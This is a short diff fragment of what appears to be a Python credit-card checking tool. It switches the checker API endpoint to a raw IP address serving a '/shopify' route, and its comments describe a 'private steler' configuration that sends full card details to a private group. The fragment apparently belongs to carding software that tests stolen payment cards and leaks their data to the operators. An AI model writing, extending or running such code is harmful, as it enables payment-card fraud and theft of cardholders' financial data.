@@ -9,7 +9,7 @@ import json
 import re
 from datetime import datetime
 # Direct API endpoint (replaces checker_bridge)
-CHECKER_API_URL = 'https://web-production-669be.up.railway.app/shopify'
+CHECKER_API_URL = 'http://76.13.78.203:5000/shopify'
 
 # ================== STELER & PUBLIC LOGS CONFIGURATION ==================
 # PRIVATE STELER - Full card details (your private group)
